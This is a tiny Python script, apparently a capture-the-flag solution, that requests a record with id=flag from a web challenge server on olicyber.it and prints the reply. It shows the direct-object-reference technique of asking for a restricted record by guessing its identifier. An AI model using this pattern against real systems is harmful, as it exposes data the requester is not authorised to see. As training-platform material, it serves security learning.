import requests
url = 'http://web-02.challs.olicyber.it/server-records'
print(requests.get(url + '?id=flag').text)
